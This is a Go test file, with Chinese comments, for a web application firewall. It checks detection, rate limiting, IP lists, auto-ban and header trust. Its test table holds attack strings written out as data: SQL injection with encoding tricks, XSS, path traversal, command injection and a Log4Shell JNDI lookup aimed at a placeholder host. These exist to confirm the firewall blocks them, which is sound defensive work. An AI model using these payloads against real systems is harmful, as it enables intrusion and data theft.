package main

import (
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"strings"
	"sync"
	"testing"
	"time"
)

// quiet 静音日志:WAF 拦截请求时会打 WARN,测试里用 io.Discard 吞掉,避免输出刷屏。
var quiet = slog.New(slog.NewTextHandler(io.Discard, nil))

// echoUpstream 回显收到的请求体,用来验证 WAF 读过 body 之后上游还能完整读到。
var echoUpstream = http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
	b, _ := io.ReadAll(r.Body)
	fmt.Fprintf(rw, "ok:%s", b)
})

// newTestWAF 构造默认配置的测试 WAF:block 模式、body 上限 1KB。
// mut 钩子让单个测试只覆盖需要的字段,其余保持默认;传 nil 即全默认。
func newTestWAF(mut func(*Config)) *WAF {
	cfg := Config{Mode: ModeBlock, MaxBody: 1024}
	if mut != nil {
		mut(&cfg)
	}
	return New(cfg, DefaultRules(), quiet)
}

// do 便捷发请求:构造 http.Request → 送入 handler → 返回可断言的响应记录。
// remote 即 WAF 看到的 TCP 对端地址;默认用 TEST-NET-3 文档网段(203.0.113.0/24),不会撞真实 IP。
func do(h http.Handler, method, target, body string, hdr map[string]string, remote string) *httptest.ResponseRecorder {
	var rd io.Reader
	if body != "" {
		rd = strings.NewReader(body)
	}
	req := httptest.NewRequest(method, target, rd)
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	if remote == "" {
		remote = "203.0.113.7:1234"
	}
	req.RemoteAddr = remote
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// TestDetection 是核心检测用例表:每行一个请求 + 期望状态码(200=放行, 403=拦截, 413=超限)。
// 用例分两类:干净流量必须放行(防误报),攻击及绕过变形必须拦截(防漏报)。
func TestDetection(t *testing.T) {
	h := newTestWAF(nil).Handler(echoUpstream)
	json := map[string]string{"Content-Type": "application/json"} // JSON 请求头的简写

	cases := []struct {
		name, method, target, body string
		hdr                        map[string]string
		want                       int
	}{
		// —— 干净流量:正常英文里出现 ' 或 select 这类词也不能拦(误报红线)——
		{"clean GET", "GET", "/api/users?id=42&sort=name", "", nil, 200},
		{"clean JSON with apostrophe and 'select'", "POST", "/api", `{"name":"O'Brien","note":"Union Station: select tickets"}`, json, 200},
		// —— SQL 注入及绕过变形:多重编码、注释穿插、JSON 转义……normalize 之后都应命中 ——
		{"sqli union select", "GET", "/s?q=1+UNION+SELECT+password+FROM+users", "", nil, 403},
		// %2527 = 双重 URL 编码的 '(%) → 要解多层才能现形
		{"sqli double url-encoded", "GET", "/s?q=%2527%2520OR%25201%253D1", "", nil, 403},
		{"sqli comment obfuscation", "GET", "/s?q=1+UNION/**/SELECT/**/1,2", "", nil, 403},
		// 非法序列 %zz 不许让解码整体放弃 —— 宽容解码,坏序列掩护不了后面的 payload
		{"sqli bad %zz evasion attempt", "GET", "/s?q=%zz'+or+1=1", "", nil, 403},
		{"sqli in JSON via \\u0027", "POST", "/api", `{"name":"' OR 1=1 --"}`, json, 403},
		// —— XSS / 路径穿越 / 命令注入 / Log4Shell / 扫描器指纹 ——
		{"xss script tag", "GET", "/s?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "", nil, 403},
		{"xss event handler in form body", "POST", "/c", "bio=<img src=x onerror=alert(1)>", map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, 403},
		{"path traversal in query", "GET", "/dl?file=../../etc/passwd", "", nil, 403},
		// ..%2f 出现在 URL 路径里,解码后同样是 ../
		{"path traversal encoded in path", "GET", "/files/..%2f..%2fetc%2fpasswd", "", nil, 403},
		{"cmd injection", "GET", "/ping?host=1.1.1.1;cat+/tmp/x", "", nil, 403},
		{"log4shell in header", "GET", "/", "", map[string]string{"X-Api-Version": "${jndi:ldap://evil/a}"}, 403},
		{"scanner user-agent", "GET", "/", "", map[string]string{"User-Agent": "sqlmap/1.7"}, 403},
		// 超过 MaxBody(1KB)直接 413,不把大包体读进内存
		{"body too large", "POST", "/up", strings.Repeat("a", 2048), nil, 413},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			rec := do(h, c.method, c.target, c.body, c.hdr, "")
			if rec.Code != c.want {
				t.Fatalf("status = %d, want %d (body=%q)", rec.Code, c.want, rec.Body.String())
			}
		})
	}
}

// WAF 检测 body 会先把内容读出来,读完后必须回填 r.Body,否则上游只能读到空流。
// 本用例防这一回归:echo 源站原样返回收到的 body,内容必须一字不差。
func TestBodyReachesUpstream(t *testing.T) {
	h := newTestWAF(nil).Handler(echoUpstream)
	rec := do(h, "POST", "/x", "hello=world", map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, "")
	if rec.Code != 200 || rec.Body.String() != "ok:hello=world" {
		t.Fatalf("got %d %q", rec.Code, rec.Body.String())
	}
}

// detect 模式只记日志、不拦截:新规则上线前先在这个模式下灰度观察误报。
func TestDetectModePasses(t *testing.T) {
	h := newTestWAF(func(c *Config) { c.Mode = ModeDetect }).Handler(echoUpstream)
	if rec := do(h, "GET", "/s?q=1+union+select+1", "", nil, ""); rec.Code != 200 {
		t.Fatalf("detect mode should not block, got %d", rec.Code)
	}
}

// 白名单 IP 完全跳过检测(连攻击请求都放行);黑名单 IP 无条件 403。
func TestAllowAndDenyLists(t *testing.T) {
	h := newTestWAF(func(c *Config) {
		c.Allow = []netip.Prefix{netip.MustParsePrefix("10.0.0.0/8")}
		c.Deny = []netip.Prefix{netip.MustParsePrefix("198.51.100.0/24")}
	}).Handler(echoUpstream)

	if rec := do(h, "GET", "/s?q=1+union+select+1", "", nil, "10.1.2.3:99"); rec.Code != 200 {
		t.Fatalf("allowlisted IP should bypass inspection, got %d", rec.Code)
	}
	if rec := do(h, "GET", "/ok", "", nil, "198.51.100.9:99"); rec.Code != 403 {
		t.Fatalf("denylisted IP should be rejected, got %d", rec.Code)
	}
}

// 令牌桶 burst=2:同一 IP 第 3 个请求超桶 → 429 且必须带 Retry-After;
// 限流按 IP 隔离,另一个 IP 不受影响。
func TestRateLimitHandler(t *testing.T) {
	h := newTestWAF(func(c *Config) { c.RPS = 1; c.Burst = 2 }).Handler(echoUpstream)
	for i := 0; i < 2; i++ {
		if rec := do(h, "GET", "/", "", nil, "203.0.113.1:1"); rec.Code != 200 {
			t.Fatalf("req %d: want 200, got %d", i, rec.Code)
		}
	}
	rec := do(h, "GET", "/", "", nil, "203.0.113.1:1")
	if rec.Code != 429 || rec.Header().Get("Retry-After") == "" {
		t.Fatalf("want 429 + Retry-After, got %d %v", rec.Code, rec.Header())
	}
	if rec := do(h, "GET", "/", "", nil, "203.0.113.2:1"); rec.Code != 200 {
		t.Fatalf("other IP must not be affected, got %d", rec.Code)
	}
}

// 用可注入的假时钟(l.now)精确验证令牌随时间补充 —— 真实 time.Now 无法控制流逝。
func TestLimiterRefill(t *testing.T) {
	now := time.Unix(1000, 0)
	l := NewLimiter(1, 3)
	l.now = func() time.Time { return now }
	ip := netip.MustParseAddr("192.0.2.1")
	for i := 0; i < 3; i++ {
		if ok, _ := l.Allow(ip); !ok {
			t.Fatalf("burst request %d denied", i)
		}
	}
	// 桶已空:必须拒绝,等待时间应落在 (0, 1s](速率 1rps)
	ok, wait := l.Allow(ip)
	if ok || wait <= 0 || wait > time.Second {
		t.Fatalf("want denied with wait in (0,1s], got ok=%v wait=%v", ok, wait)
	}
	// 时间推进 1s,按 1rps 恰好补回 1 个令牌
	now = now.Add(time.Second)
	if ok, _ := l.Allow(ip); !ok {
		t.Fatal("token should have refilled after 1s")
	}
}

// IPv6 终端通常整段共享一个 /64 前缀,按单地址限流形同虚设:
// 同一 /64 里的两个地址必须共用一个桶。
func TestLimiterIPv6SharesSlash64(t *testing.T) {
	l := NewLimiter(1, 1)
	a := netip.MustParseAddr("2001:db8:1:2::1")
	b := netip.MustParseAddr("2001:db8:1:2:ffff::9") // 同一个 /64
	if ok, _ := l.Allow(a); !ok {
		t.Fatal("first should pass")
	}
	if ok, _ := l.Allow(b); ok {
		t.Fatal("same /64 must share one bucket")
	}
}

// 自动封禁:窗口内违规达到 BanStrikes(3)次 → 封 IP 一段时间(BanFor)。
// 封禁后连干净请求也 403;其他 IP 不受牵连。
func TestAutoBan(t *testing.T) {
	h := newTestWAF(func(c *Config) { c.BanStrikes = 3; c.BanFor = time.Minute }).Handler(echoUpstream)
	ip := "203.0.113.50:1"
	for i := 0; i < 3; i++ {
		if rec := do(h, "GET", "/s?q=1+union+select+1", "", nil, ip); rec.Code != 403 {
			t.Fatalf("attack %d: want 403, got %d", i, rec.Code)
		}
	}
	// 之后即使是干净请求也应被封
	if rec := do(h, "GET", "/clean", "", nil, ip); rec.Code != 403 {
		t.Fatalf("banned IP should be rejected, got %d", rec.Code)
	}
	if rec := do(h, "GET", "/clean", "", nil, "203.0.113.51:1"); rec.Code != 200 {
		t.Fatalf("other IP should be fine, got %d", rec.Code)
	}
}

// X-Forwarded-For 客户端可以随意伪造。不信任时必须按 TCP 对端地址判定;
// 信任时只取最右一项 —— 那才是可信代理自己追加的,左侧内容客户端想写什么写什么。
func TestXFFOnlyWhenTrusted(t *testing.T) {
	hdr := map[string]string{"X-Forwarded-For": "6.6.6.6, 10.9.9.9"}
	deny := []netip.Prefix{netip.MustParsePrefix("10.9.9.9/32")}

	untrusted := newTestWAF(func(c *Config) { c.Deny = deny }).Handler(echoUpstream)
	if rec := do(untrusted, "GET", "/", "", hdr, "203.0.113.1:1"); rec.Code != 200 {
		t.Fatalf("XFF must be ignored when not trusted, got %d", rec.Code)
	}
	trusted := newTestWAF(func(c *Config) { c.Deny = deny; c.TrustXFF = true }).Handler(echoUpstream)
	if rec := do(trusted, "GET", "/", "", hdr, "203.0.113.1:1"); rec.Code != 403 {
		t.Fatalf("rightmost XFF entry should be used when trusted, got %d", rec.Code)
	}
}

// 内部统计接口仅限本机访问,公网访问一律 404,避免暴露内部状态。
func TestMetricsLoopbackOnly(t *testing.T) {
	h := newTestWAF(nil).Handler(echoUpstream)
	if rec := do(h, "GET", "/__waf/metrics", "", nil, "127.0.0.1:5"); rec.Code != 200 {
		t.Fatalf("loopback should see metrics, got %d", rec.Code)
	}
	if rec := do(h, "GET", "/__waf/metrics", "", nil, "203.0.113.1:5"); rec.Code != 404 {
		t.Fatalf("remote must not see metrics, got %d", rec.Code)
	}
}

// 配合 go test -race:16 个 goroutine 各打 200 个请求,同时并发热更新规则 50 次。
// 验证 atomic.Pointer 无锁热替换在读路径上的并发正确性 —— 不应有数据竞争。
func TestConcurrentTrafficWithHotReload(t *testing.T) {
	w := newTestWAF(func(c *Config) { c.RPS = 1e6; c.Burst = 1e6; c.BanStrikes = 0 })
	h := w.Handler(echoUpstream)

	var wg sync.WaitGroup
	for g := 0; g < 16; g++ {
		wg.Add(1)
		go func(g int) {
			defer wg.Done()
			for i := 0; i < 200; i++ {
				target, want := "/ok?i=1", 200
				if i%2 == 0 {
					target, want = "/s?q=1+union+select+1", 403
				}
				remote := fmt.Sprintf("203.0.113.%d:1", g+1)
				if rec := do(h, "GET", target, "", nil, remote); rec.Code != want {
					t.Errorf("g%d i%d: want %d got %d", g, i, want, rec.Code)
					return
				}
			}
		}(g)
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 50; i++ {
			w.SetRules(DefaultRules())
		}
	}()
	wg.Wait()
}

// rules.example.json 随仓库分发, 必须始终能被 LoadRules 编译;
// 顺带验证 JSON 里的 _comment 等未知字段会被安全忽略。
func TestExampleRulesLoad(t *testing.T) {
	rs, err := LoadRules("rules.example.json")
	if err != nil {
		t.Fatalf("load rules.example.json: %v", err)
	}
	if len(rs) != 3 {
		t.Fatalf("want 3 rules, got %d", len(rs))
	}
	for _, r := range rs {
		if r.Pattern == nil {
			t.Fatalf("rule %q: pattern not compiled", r.ID)
		}
	}
	if !rs[0].Pattern.MatchString("1 union select password from users") {
		t.Fatal("custom-001 should match union select payload")
	}
}

// 基线性能:干净请求要把全部规则扫一遍,是最慢路径(参考:约 39µs/次 @2vCPU)。
// 规则越多越慢;上百条后需要预过滤(先用 Contains/Aho-Corasick 筛关键字再跑正则)。
func BenchmarkInspectClean(b *testing.B) {
	w := newTestWAF(nil)
	fs := []Field{{"path", "/api/v1/orders"}, {"query", "page=2&size=20&sort=created_at"},
		{"header:user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}}
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		w.inspect(fs)
	}
}

// 攻击请求在较早位置命中即返回,明显更快(参考:约 3.4µs/次)。
func BenchmarkInspectAttack(b *testing.B) {
	w := newTestWAF(nil)
	fs := []Field{{"path", "/s"}, {"query", "q=%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users"}}
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		w.inspect(fs)
	}
}
